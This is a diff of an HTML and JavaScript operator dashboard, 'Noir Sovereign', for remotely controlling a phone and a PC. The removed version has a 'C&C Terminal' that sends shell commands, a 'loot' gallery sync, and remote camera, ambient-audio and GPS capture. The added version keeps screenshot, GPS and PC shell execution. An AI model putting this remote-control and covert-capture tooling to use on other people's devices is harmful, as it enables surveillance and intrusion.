@@ -1,611 +1,91 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NOIR SOVEREIGN | OMEGA ASCENSION v17.2</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg: #010103;
-            --panel: rgba(8, 8, 15, 0.9);
-            --accent: #00f2ff;
-            --accent-glow: rgba(0, 242, 255, 0.4);
-            --gold: #ffcc00;
-            --gold-glow: rgba(255, 204, 0, 0.3);
-            --danger: #ff0055;
-            --danger-glow: rgba(255, 0, 85, 0.3);
-            --success: #00ffaa;
-            --text: #e0e0f0;
-            --border: rgba(0, 242, 255, 0.1);
-            --shadow: 0 10px 40px 0 rgba(0, 0, 0, 1);
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rajdhani', sans-serif; cursor: default; }
-        body {
-            background: var(--bg);
-            color: var(--text);
-            height: 100vh;
-            overflow: hidden;
-            background-image: 
-                radial-gradient(circle at 5% 5%, #0a0a20 0%, transparent 40%),
-                radial-gradient(circle at 95% 95%, #150505 0%, transparent 40%),
-                url('https://www.transparenttextures.com/patterns/asfalt-dark.png');
-            background-attachment: fixed;
-        }
-
-        /* LAYOUT CORE */
-        .omega-grid {
-            display: grid;
-            grid-template-columns: 90px 280px 1fr;
-            height: 100vh;
-            padding: 12px;
-            gap: 12px;
-        }
-
-        .glass {
-            background: var(--panel);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            display: flex;
-            flex-direction: column;
-            box-shadow: var(--shadow);
-            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            position: relative;
-        }
-        .glass::before {
-            content: ''; position: absolute; inset: 0; border-radius: 12px;
-            background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, transparent 100%);
-            pointer-events: none;
-        }
-
-        /* MASTER MENU */
-        .master-nav { align-items: center; padding: 30px 0; gap: 20px; }
-        .nav-node {
-            width: 54px; height: 54px;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; border-radius: 15px;
-            border: 1px solid transparent; transition: 0.3s;
-            font-size: 1.5rem; color: #556;
-            filter: grayscale(1);
-        }
-        .nav-node:hover { color: #fff; filter: grayscale(0); transform: scale(1.1); }
-        .nav-node.active {
-            background: rgba(0, 242, 255, 0.12);
-            border-color: var(--accent);
-            color: var(--accent);
-            filter: grayscale(0);
-            box-shadow: 0 0 25px var(--accent-glow);
-        }
-
-        /* SIDEBAR */
-        .sidebar { padding: 25px; border-right: 1px solid rgba(255,255,255,0.02); }
-        .side-head {
-            font-family: 'Orbitron', sans-serif; font-size: 0.75rem; 
-            color: var(--gold); letter-spacing: 4px; margin-bottom: 35px;
-            text-shadow: 0 0 10px var(--gold-glow);
-        }
-        .side-item {
-            padding: 15px; border-radius: 8px; background: rgba(255,255,255,0.02);
-            border: 1px solid rgba(255,255,255,0.04); color: #889; 
-            cursor: pointer; font-size: 0.85rem; margin-bottom: 10px;
-            transition: 0.2s; display: flex; justify-content: space-between;
-        }
-        .side-item:hover {
-            background: rgba(0, 242, 255, 0.05); color: #fff; border-color: var(--accent);
-        }
-
-        /* MAIN HUB */
-        .hub { padding: 0; display: grid; grid-template-rows: 70px 1fr; }
-        .hub-header {
-            padding: 0 30px; display: flex; justify-content: space-between; align-items: center;
-            background: rgba(0,0,0,0.2); border-bottom: 1px solid var(--border);
-        }
-        .hub-title { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.1rem; letter-spacing: 5px; }
-
-        .viewport { position: relative; overflow: hidden; background: #000; }
-        .vision-stream { width: 100%; height: 100%; object-fit: contain; cursor: crosshair; }
-
-        /* TELEMETRY OVERLAY */
-        .telemetry-tag {
-            position: absolute; top: 20px; right: 20px; display: flex; gap: 10px; z-index: 10;
-        }
-        .pill {
-            background: rgba(0,0,0,0.6); padding: 5px 15px; border-radius: 30px;
-            border: 1px solid var(--border); font-size: 0.75rem; font-weight: 700;
-            color: var(--accent); backdrop-filter: blur(10px);
-        }
-
-        /* TERMINAL (HEALER LOGS) */
-        .terminal-box {
-            position: absolute; bottom: 20px; left: 20px; right: 20px;
-            height: 180px; background: rgba(0,5,10,0.8); border: 1px solid var(--border);
-            border-radius: 8px; padding: 15px; font-family: 'Fira Code', monospace;
-            font-size: 0.7rem; overflow-y: auto; color: #00ffaa;
-            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
-        }
-        .log-entry { margin-bottom: 4px; border-bottom: 1px solid rgba(0,255,170,0.05); padding-bottom: 2px; }
-
-        /* FLOATING MIRROR (PHONE FRAME) */
-        .phone-mirror {
-            position: fixed; top: 40px; right: 40px; width: 300px; height: 620px;
-            background: #050505; border: 4px solid #111; border-radius: 40px;
-            box-shadow: 0 0 50px rgba(0,0,0,0.8), 0 0 20px var(--accent-glow);
-            z-index: 1000; display: none; flex-direction: column; overflow: hidden;
-        }
-        .phone-notch { width: 100px; height: 25px; background: #111; margin: 0 auto; border-radius: 0 0 15px 15px; }
-
-        /* CHAT UI */
-        .chat-wrap { display: flex; flex-direction: column; height: 100%; }
-        .chat-log { flex: 1; overflow-y: auto; padding: 30px; display: flex; flex-direction: column; gap: 15px; }
-        .bubble { padding: 12px 20px; border-radius: 18px; font-size: 0.9rem; max-width: 80%; }
-        .bubble.agent { background: rgba(0, 242, 255, 0.05); border: 1px solid var(--border); align-self: flex-start; color: var(--accent); }
-        .bubble.user { background: rgba(255, 204, 0, 0.05); border: 1px solid rgba(255,204,0,0.15); align-self: flex-end; color: var(--gold); }
-
-        .brain-input-group {
-            display: flex; gap: 10px; padding: 20px; background: rgba(0,0,0,0.4); border-top: 1px solid var(--border);
-        }
-        .brain-input {
-            flex: 1; background: rgba(0,0,0,0.3); border: 1px solid var(--border); 
-            color: #fff; padding: 12px 20px; border-radius: 30px; font-size: 0.9rem;
-        }
-        .brain-input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 10px var(--accent-glow); }
-
-        /* BUTTONS */
-        .btn-action {
-            background: none; border: 1px solid var(--accent); color: var(--accent);
-            padding: 8px 20px; border-radius: 5px; font-family: 'Orbitron'; font-size: 0.7rem;
-            cursor: pointer; transition: 0.3s;
-        }
-        .btn-action:hover { background: var(--accent); color: #000; box-shadow: 0 0 15px var(--accent); }
-
-        /* ANIMATIONS */
-        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
-        .scanline {
-            width: 100%; height: 2px; background: rgba(0, 242, 255, 0.1);
-            position: absolute; top: 0; left: 0; pointer-events: none;
-            animation: scan 4s linear infinite;
-        }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-
-        .click-dot {
-            position: absolute; width: 30px; height: 30px; border: 2px solid var(--accent);
-            border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none;
-            animation: click-ripple 0.6s ease-out forwards;
-        }
-        @keyframes click-ripple {
-            0% { transform: translate(-50%, -50%) scale(0.1); opacity: 1; }
-            100% { transform: translate(-50%, -50%) scale(1.5); opacity: 0; }
-        }
-    </style>
+    <title>Noir Sovereign Elite | Commander Dashboard</title>
+    <link rel="stylesheet" href="css/style.css">
+    <meta name="description" content="Autonomous Sovereign Agent Command Interface">
 </head>
 <body>
-
-    <!-- RECONNECT UI -->
-    <div id="reconnect-ui" style="position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:9999; display:none; flex-direction:column; justify-content:center; align-items:center;">
-        <h1 style="font-family:'Orbitron'; color:var(--danger); letter-spacing:10px; margin-bottom:20px;">LINK SEVERED</h1>
-        <div class="pill" style="animation:pulse 1s infinite; margin-bottom:30px;">RE-ESTABLISHING NEURAL TUNNEL...</div>
-        <button onclick="activateBypass()" class="btn-action" style="border-color:var(--accent); color:var(--accent); padding:15px 40px;">
-            ENTER NEURAL HUB (BYPASS)
-        </button>
-    </div>
-
-    <!-- OMEGA LAYOUT -->
-    <div class="omega-grid">
-        <!-- NODE SELECTOR -->
-        <nav class="glass master-nav">
-            <div class="nav-node active" onclick="showPage('vision', this)" title="Vision Hub">👁️</div>
-            <div class="nav-node" onclick="showPage('sensors', this)" title="Sensors">📡</div>
-            <div class="nav-node" onclick="showPage('loot', this)" title="Media Vault">📦</div>
-            <div class="nav-node" onclick="showPage('chat', this)" title="C&C Terminal">💬</div>
-            <div class="nav-node" onclick="showPage('evolution', this)" title="Apex Evolution">🧬</div>
-            <div class="nav-node" onclick="showPage('healer', this)" title="Neuro-Healer">🚑</div>
-            <div class="nav-node" onclick="showPage('system', this)" title="System Core">⚙️</div>
-        </nav>
-
-        <!-- SIDE CONTROL -->
-        <aside class="glass sidebar">
-            <div class="side-head" id="sidebar-title">VISION HUB</div>
-            <div id="side-menu-content"></div>
-        </aside>
-
-        <!-- MAIN HUB -->
-        <main class="glass hub">
-            <header class="hub-header">
-                <div class="hub-title" id="page-title">MISSION CONTROL</div>
-                <div style="display:flex; gap:15px; align-items:center;">
-                    <div class="pill" id="sync-status" style="border-color:var(--success); color:var(--success);">SYNC: ONLINE</div>
-                    <button onclick="toggleMirror()" class="btn-action">📱 MIRROR</button>
-                </div>
-            </header>
-
-            <div class="viewport" id="main-view">
-                <!-- Content injected here -->
+    <div class="bg-mesh"></div>
+    
+    <div class="container">
+        <header class="fade-in">
+            <div class="logo">
+                <h1>NOIR SOVEREIGN</h1>
+                <p style="color: var(--text-secondary); font-size: 0.8rem; letter-spacing: 3px;">V18.5 OMEGA MESH</p>
             </div>
-        </main>
-    </div>
+            <div id="connection-status" class="status-pill status-online">
+                <div class="pulse"></div>
+                LINK ACTIVE
+            </div>
+        </header>
 
-    <!-- PHONE MIRROR -->
-    <div id="phone-mirror" class="phone-mirror">
-        <div class="phone-notch"></div>
-        <div style="flex:1; position:relative; background:#000;">
-            <img id="mirror-img" src="" style="width:100%; height:100%; object-fit:contain;">
-            <div id="mirror-telemetry" style="position:absolute; bottom:20px; left:20px; font-family:'Fira Code'; font-size:0.6rem; color:var(--success);">LIVE STREAM ACTIVE</div>
+        <div class="grid">
+            <!-- 📱 Mobile Agent Core -->
+            <div class="card fade-in" style="animation-delay: 0.1s;">
+                <h3><span style="color: var(--accent-blue);">01</span> REDMI NOTE 14</h3>
+                <div id="mobile-stats">
+                    <p style="font-size: 2rem; font-weight: 800; margin-bottom: 0.5rem;">98% <span style="font-size: 1rem; color: var(--text-secondary);">BATTERY</span></p>
+                    <p style="color: var(--success); font-size: 0.9rem;">+ NEURAL PERSISTENCE ACTIVE</p>
+                </div>
+                <div style="margin-top: 2rem;">
+                    <button onclick="sendCommand('screenshot')">CAPTURE SCREEN</button>
+                    <button onclick="sendCommand('location')" style="background: rgba(255,255,255,0.05);">GET GPS LOCATION</button>
+                </div>
+            </div>
+
+            <!-- 🧠 VPS Brain Intelligence -->
+            <div class="card fade-in" style="animation-delay: 0.2s;">
+                <h3><span style="color: var(--accent-purple);">02</span> NEURAL BRAIN (4GB)</h3>
+                <div id="brain-stats">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                        <span>RAM UTILIZATION</span>
+                        <span>42%</span>
+                    </div>
+                    <div style="width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px;">
+                        <div style="width: 42%; height: 100%; background: var(--accent-purple); border-radius: 3px;"></div>
+                    </div>
+                    <p style="margin-top: 1rem; font-size: 0.85rem; color: var(--text-secondary);">
+                        RAG Memory: 1.2k Chunks<br>
+                        Local AI: TinyLlama Ready
+                    </p>
+                </div>
+            </div>
+
+            <!-- 💻 PC Bridge -->
+            <div class="card fade-in" style="animation-delay: 0.3s;">
+                <h3><span style="color: var(--accent-blue);">03</span> PC MASTER BRIDGE</h3>
+                <div id="pc-status" style="margin-bottom: 1.5rem;">
+                    <div class="status-pill status-online">SECURE TUNNEL: ACTIVE</div>
+                </div>
+                <input type="text" id="pc-command" placeholder="Enter shell command...">
+                <button onclick="sendPCCommand()">EXECUTE ON PC</button>
+            </div>
+
+            <!-- 👁️ Vision Sentinel Feed -->
+            <div class="card fade-in" style="grid-column: span 1; animation-delay: 0.4s;">
+                <h3><span style="color: var(--danger);">04</span> VISION SENTINEL</h3>
+                <img id="last-screenshot" src="https://via.placeholder.com/800x450/050505/00d2ff?text=WAITING+FOR+SENTINEL+FEED" class="vision-img" alt="Sentinel View">
+                <p id="vision-analysis" style="margin-top: 1rem; font-size: 0.8rem; color: var(--text-secondary); font-style: italic;">
+                    No risks detected in last scan.
+                </p>
+            </div>
+
+            <!-- 📟 Terminal Console -->
+            <div class="card fade-in" style="grid-column: span 2; animation-delay: 0.5s;">
+                <h3>SYSTEM LOGS & EVOLUTION</h3>
+                <div id="terminal" class="terminal">
+                    <div class="terminal-line">System Bootstrapped. Version 18.5 OMEGA.</div>
+                    <div class="terminal-line">Connection established with Gateway...</div>
+                    <div class="terminal-line">Neural Persistence verified on Redmi Note 14.</div>
+                    <div class="terminal-line">Waiting for command...</div>
+                </div>
+            </div>
         </div>
     </div>
 
-    <script>
-        const API = "/api";
-        let currentPage = 'vision';
-        let isMirroring = false;
-        let bypassActive = false;
-
-        function activateBypass() {
-            bypassActive = true;
-            document.getElementById('reconnect-ui').style.display = 'none';
-            updateTerminal("NEURAL BYPASS ACTIVATED", "var(--gold)");
-        }
-
-        function toggleMirror() {
-            isMirroring = !isMirroring;
-            document.getElementById('phone-mirror').style.display = isMirroring ? 'flex' : 'none';
-        }
-
-        const PAGES = {
-            vision: {
-                title: "VISION HUB",
-                menu: [
-                    { label: "Capture Now", cmd: 'screenshot' },
-                    { label: "Toggle Proactive", cmd: 'toggle_proactive' }
-                ],
-                render: () => `
-                    <div style="width:100%; height:100%; position:relative;">
-                        <img id="v-stream" class="vision-stream" src="/api/asset/latest" onclick="handleVisionClick(event)">
-                        <div class="scanline"></div>
-                        <div class="telemetry-tag">
-                            <div class="pill" id="v-res">1080x2400</div>
-                            <div class="pill" id="v-fps">SYNCED</div>
-                        </div>
-                        <div class="terminal-box" id="healer-terminal">
-                            <div class="log-entry" style="color:var(--gold);">[SYSTEM] Sovereign Healer v17.2 Active. Monitoring logs...</div>
-                        </div>
-                    </div>
-                `
-            },
-            sensors: {
-                title: "SENSOR ARRAY",
-                menu: [
-                    { label: "Rear Cam Photo", cmd: 'camera_back' },
-                    { label: "Front Cam Photo", cmd: 'camera_front' },
-                    { label: "Ambient Audio", cmd: 'audio_record' },
-                    { label: "GPS Locate", cmd: 'location_get' }
-                ],
-                render: () => `<div style="padding:50px; text-align:center; opacity:0.3; font-family:'Orbitron';">SENSORY DATA STREAMING...</div>`
-            },
-            loot: {
-                title: "MEDIA VAULT",
-                menu: [
-                    { label: "Sync Gallery", cmd: 'gallery_sync' },
-                    { label: "Deep Fetch", cmd: 'assets_fetch' }
-                ],
-                render: () => `<div style="display:grid; grid-template-columns:repeat(auto-fill, minmax(200px, 1fr)); gap:15px; padding:20px;" id="loot-grid"></div>`
-            },
-            chat: {
-                title: "C&C TERMINAL",
-                menu: [
-                    { label: "Purge Context", cmd: 'chat_clear' }
-                ],
-                render: () => `
-                    <div class="chat-wrap">
-                        <div class="chat-log" id="chat-box"></div>
-                        <div class="chat-input">
-                            <input type="text" id="chat-in" placeholder="Enter Command Node..." onkeypress="if(event.key==='Enter') sendChat()">
-                            <button onclick="sendChat()" class="btn-action">EXECUTE</button>
-                        </div>
-                    </div>
-                `
-            },
-            evolution: {
-                title: "NEURAL HUB",
-                menu: [
-                    { label: "Analyze Screen", cmd: 'vision_analyze' },
-                    { label: "Self-Learn Mode", cmd: 'autonomous_mode' }
-                ],
-                render: () => `
-                    <div style="display:grid; grid-template-columns: 1.5fr 1fr; height:100%; gap:2px; background:var(--border);">
-                        <div class="glass" style="border-radius:0; background:rgba(0,0,0,0.3); display:flex; flex-direction:column;">
-                            <div class="chat-log" id="brain-chat-log">
-                                <div class="bubble agent">I am NOIR BRAIN v17.5. Systems synchronized. Waiting for directive.</div>
-                            </div>
-                            <div class="brain-input-group">
-                                <input type="text" id="brain-msg" class="brain-input" placeholder="Enter Neural Command (e.g. 'Check WhatsApp')..." onkeypress="if(event.key==='Enter') sendBrainMsg()">
-                                <button onclick="sendBrainMsg()" class="btn-action" style="border-radius:30px; padding:0 25px;">THINK</button>
-                            </div>
-                        </div>
-                        <div style="display:flex; flex-direction:column; gap:2px;">
-                            <div class="glass" style="border-radius:0; padding:25px; flex:1;">
-                                <div class="side-head">🧠 ACTIVE SKILLS</div>
-                                <div id="skill-box" style="display:flex; flex-wrap:wrap; gap:8px; margin-top:10px;"></div>
-                                
-                                <div class="side-head" style="margin-top:30px;">🧠 NEURAL MEMORY</div>
-                                <div id="memory-stats" style="font-size:0.8rem; margin-top:10px; color:#889;">
-                                    <div class="pill" style="margin-bottom:10px; display:block;">Context: <span id="mem-ctx">--</span></div>
-                                    <div class="pill" style="margin-bottom:10px; display:block;">Growth: <span id="mem-growth">97.3%</span></div>
-                                </div>
-                            </div>
-                            <div class="glass" style="border-radius:0; padding:25px; height:200px;">
-                                <div class="side-head">📊 AUTONOMOUS TASK</div>
-                                <div id="brain-task" style="font-size:0.8rem; color:var(--accent); margin-top:10px;">Idle...</div>
-                            </div>
-                        </div>
-                    </div>
-                `
-            },
-            healer: {
-                title: "NEURO-HEALER",
-                menu: [
-                    { label: "Full Scan", cmd: 'scan' },
-                    { label: "Reset Matrix", cmd: 'reset_link' }
-                ],
-                render: () => `
-                    <div style="padding:30px; height:100%; display:flex; flex-direction:column; gap:20px;">
-                        <div class="glass" style="padding:30px; border-top:4px solid var(--accent); text-align:center;">
-                            <div id="healer-status" style="font-family:'Orbitron'; font-size:1.5rem; margin-bottom:10px; color:var(--accent);">AI HEALER: STANDBY</div>
-                            <button onclick="initiateHeal()" class="btn-action" style="font-size:1rem; padding:15px 40px;">INITIATE NEURO-HEAL</button>
-                        </div>
-                        <div class="glass" style="flex:1; padding:20px; background:rgba(0,0,0,0.4); font-family:'Fira Code'; font-size:0.8rem; overflow-y:auto;" id="healer-log">
-                            <div style="color:#555;">[SYSTEM] Initializing diagnostics...</div>
-                        </div>
-                    </div>
-                `
-            },
-            system: {
-                title: "SYSTEM CORE",
-                menu: [
-                    { label: "Deep Purge", cmd: 'total-purge' },
-                    { label: "Sync Matrix", cmd: 'update' }
-                ],
-                render: () => `
-                    <div style="padding:30px;">
-                        <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:20px; margin-bottom:30px;">
-                            <div class="glass" style="padding:20px; border-left:4px solid var(--gold);">
-                                <div style="font-size:0.7rem; opacity:0.5;">CPU LOAD</div>
-                                <div id="s-cpu" style="font-size:1.5rem; font-weight:900;">--</div>
-                            </div>
-                            <div class="glass" style="padding:20px; border-left:4px solid var(--accent);">
-                                <div style="font-size:0.7rem; opacity:0.5;">RAM USAGE</div>
-                                <div id="s-ram" style="font-size:1.5rem; font-weight:900;">--</div>
-                            </div>
-                            <div class="glass" style="padding:20px; border-left:4px solid var(--success);">
-                                <div style="font-size:0.7rem; opacity:0.5;">BATTERY</div>
-                                <div id="s-bat" style="font-size:1.5rem; font-weight:900;">--</div>
-                            </div>
-                        </div>
-
-                        <div class="glass" style="padding:25px; border-left:4px solid var(--danger);">
-                            <div class="side-head" style="color:var(--danger); margin-bottom:15px;">🚨 CRITICAL AUTHORITY</div>
-                            <div style="display:flex; gap:15px;">
-                                <button onclick="executeCmd('system_shutdown')" class="btn-action" style="border-color:var(--danger); color:var(--danger); flex:1;">🛑 KILL SWITCH</button>
-                                <button onclick="executeCmd('system_sleep')" class="btn-action" style="border-color:var(--gold); color:var(--gold); flex:1;">💤 DEEP SLEEP</button>
-                            </div>
-                            <p style="font-size:0.7rem; color:#555; margin-top:15px; font-style:italic;">Absolute authority verified. Emergency termination enabled.</p>
-                        </div>
-                    </div>
-                `
-            }
-        };
-
-        function showPage(pageId, el) {
-            currentPage = pageId;
-            const page = PAGES[pageId];
-            document.querySelectorAll('.nav-node').forEach(n => n.classList.remove('active'));
-            if(el) el.classList.add('active');
-            
-            document.getElementById('sidebar-title').innerText = page.title;
-            document.getElementById('page-title').innerText = `NODE: ${pageId.toUpperCase()}`;
-            
-            const sideMenu = document.getElementById('side-menu-content');
-            sideMenu.innerHTML = page.menu.map(item => `
-                <div class="side-item" onclick="executeCmd('${item.cmd}')">
-                    ${item.label} <span>➔</span>
-                </div>
-            `).join('');
-            
-            document.getElementById('main-view').innerHTML = page.render();
-            if(pageId === 'loot') loadLoot();
-            if(pageId === 'evolution') { loadEvolution(); }
-        }
-
-        async function executeCmd(type, params={}) {
-            if(!type) return;
-            const finalType = type === 'click' ? 'tap' : type;
-            updateTerminal(`EXECUTING: ${finalType.toUpperCase()}`, 'var(--accent)');
-            try {
-                const res = await fetch(`${API}/command`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ action: { type: finalType, ...params }, description: finalType.toUpperCase() })
-                });
-                return await res.json();
-            } catch (e) {
-                updateTerminal("LINK INTERRUPTED.", "var(--danger)");
-            }
-        }
-
-        async function syncStatus() {
-            try {
-                const r = await fetch(`${API}/status`);
-                const d = await r.json();
-                
-                const sync = document.getElementById('sync-status');
-                const recon = document.getElementById('reconnect-ui');
-                
-                sync.innerText = d.online ? "LINK: SECURE" : "LINK: SEVERED";
-                sync.style.color = d.online ? "var(--success)" : "var(--danger)";
-                sync.style.borderColor = d.online ? "var(--success)" : "var(--danger)";
-
-                if(!d.online && !bypassActive) {
-                    recon.style.display = 'flex';
-                } else if(d.online) {
-                    recon.style.display = 'none';
-                    // BUG FIX: Do NOT auto-reset bypassActive. Manual control only.
-                }
-
-                if(d.agent) {
-                    const s = d.agent.stats || {};
-                    if(document.getElementById('s-cpu')) document.getElementById('s-cpu').innerText = `${s.cpu || 0}%`;
-                    if(document.getElementById('s-ram')) document.getElementById('s-ram').innerText = `${s.ram || 0}%`;
-                    if(document.getElementById('s-bat')) document.getElementById('s-bat').innerText = `${s.bat || '--'}%`;
-
-                    if(d.agent.last_screenshot) {
-                        const url = `${API}/asset/${d.agent.last_screenshot}?t=${Date.now()}`;
-                        const vStream = document.getElementById('v-stream');
-                        if(vStream) vStream.src = url;
-                        if(isMirroring) document.getElementById('mirror-img').src = url;
-                    }
-                }
-                
-                if(currentPage === 'system') fetchLogs();
-            } catch(e) {
-                if(!bypassActive) document.getElementById('reconnect-ui').style.display = 'flex';
-            }
-        }
-
-        async function initiateHeal() {
-            const status = document.getElementById('healer-status');
-            const log = document.getElementById('healer-log');
-            
-            status.innerText = "HEALER: ANALYZING...";
-            status.style.color = "var(--gold)";
-            log.innerHTML += `<div style="color:var(--accent);">[${new Date().toLocaleTimeString()}] Starting Deep Forensic Scan...</div>`;
-            
-            log.innerHTML += `<div>[1/4] Checking Gateway Matrix...</div>`;
-            const r1 = await fetch(`${API}/status`);
-            const d1 = await r1.json();
-            log.innerHTML += `<div style="color:var(--success);">-> Gateway Status: ${d1.online ? 'REACHABLE' : 'UNREACHABLE'}</div>`;
-
-            log.innerHTML += `<div>[2/4] Injecting Neural Heal Pulse to Agent...</div>`;
-            await executeCmd('heal');
-            log.innerHTML += `<div style="color:var(--success);">-> Pulse Injected. Awaiting Agent Response.</div>`;
-
-            log.innerHTML += `<div>[3/4] Purging Local Dashboard Cache...</div>`;
-            localStorage.clear();
-            log.innerHTML += `<div style="color:var(--success);">-> Cache Purged.</div>`;
-
-            log.innerHTML += `<div>[4/4] Optimizing Neural Pathways...</div>`;
-            setTimeout(() => {
-                status.innerText = "HEALER: REPAIR COMPLETE";
-                status.style.color = "var(--success)";
-                log.innerHTML += `<div style="color:var(--success); font-weight:bold;">[SUCCESS] System Integrity Restored. Reloading...</div>`;
-                setTimeout(() => location.reload(), 2000);
-            }, 3000);
-        }
-
-        function updateTerminal(msg, color='#00ffaa') {
-            const term = document.getElementById('healer-terminal');
-            if(!term) return;
-            const d = document.createElement('div');
-            d.className = 'log-entry';
-            d.style.color = color;
-            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            term.prepend(d);
-            if(term.childNodes.length > 50) term.removeChild(term.lastChild);
-        }
-
-        async function sendChat() {
-            const input = document.getElementById('chat-in');
-            const val = input.value.trim();
-            if(!val) return;
-            const box = document.getElementById('chat-box');
-            const d = document.createElement('div');
-            d.className = 'bubble user';
-            d.innerText = val;
-            box.appendChild(d);
-            box.scrollTop = box.scrollHeight;
-            input.value = '';
-            executeCmd('shell', {cmd: val});
-        }
-
-        async function sendBrainMsg() {
-            const input = document.getElementById('brain-msg');
-            const msg = input.value.trim();
-            if(!msg) return;
-
-            const log = document.getElementById('brain-chat-log');
-            log.innerHTML += `<div class="bubble user">${msg}</div>`;
-            input.value = '';
-            log.scrollTop = log.scrollHeight;
-
-            try {
-                const r = await fetch(`${API}/brain/chat`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ message: msg })
-                });
-                const d = await r.json();
-                
-                log.innerHTML += `<div class="bubble agent">${d.response}</div>`;
-                if(d.autonomous_action) {
-                    updateTerminal(`AI INITIATED: ${d.autonomous_action.type.toUpperCase()}`, 'var(--gold)');
-                }
-                log.scrollTop = log.scrollHeight;
-            } catch(e) {
-                log.innerHTML += `<div class="bubble agent" style="color:var(--danger)">Neural link failure. Brain disconnected.</div>`;
-            }
-        }
-
-        async function loadEvolution() {
-            try {
-                const r = await fetch(`${API}/brain/status`);
-                const d = await r.json();
-                
-                document.getElementById('mem-ctx').innerText = `${d.memory_size} Context Nodes`;
-                const skillBox = document.getElementById('skill-box');
-                skillBox.innerHTML = d.skills.map(s => `<div class="pill" style="font-size:0.6rem;">${s}</div>`).join('');
-                
-                const taskRes = await fetch(`${API}/agent-task`);
-                const taskData = await taskRes.json();
-                document.getElementById('brain-task').innerText = taskData.task + ": " + taskData.status;
-            } catch(e) {}
-        }
-
-        async function fetchLogs() { }
-
-        async function loadLoot() {
-            const r = await fetch(`${API}/assets`);
-            const d = await r.json();
-            const grid = document.getElementById('loot-grid');
-            if(grid) grid.innerHTML = d.map(a => `
-                <div class="glass" style="overflow:hidden; cursor:pointer;" onclick="window.open('${API}/asset/${a.key}')">
-                    <img src="${API}/asset/${a.key}" style="width:100%; aspect-ratio:1; object-fit:cover;">
-                </div>
-            `).join('');
-        }
-
-        function handleVisionClick(e) {
-            const img = e.target;
-            const rect = img.getBoundingClientRect();
-            const xP = (e.clientX - rect.left) / rect.width;
-            const yP = (e.clientY - rect.top) / rect.height;
-            
-            const tx = Math.round(xP * 1080);
-            const ty = Math.round(yP * 2400);
-
-            const dot = document.createElement('div');
-            dot.className = 'click-dot';
-            dot.style.left = `${e.clientX - rect.left}px`;
-            dot.style.top = `${e.clientY - rect.top}px`;
-            img.parentElement.appendChild(dot);
-            setTimeout(() => dot.remove(), 600);
-
-            updateTerminal(`NODE INTERACTION: ${tx}, ${ty}`, 'var(--accent)');
-            executeCmd('tap', { x: tx, y: ty });
-        }
-
-        setInterval(syncStatus, 2000);
-        showPage('vision', document.querySelector('.nav-node'));
-    </script>
+    <script src="js/main.js"></script>
 </body>
 </html>
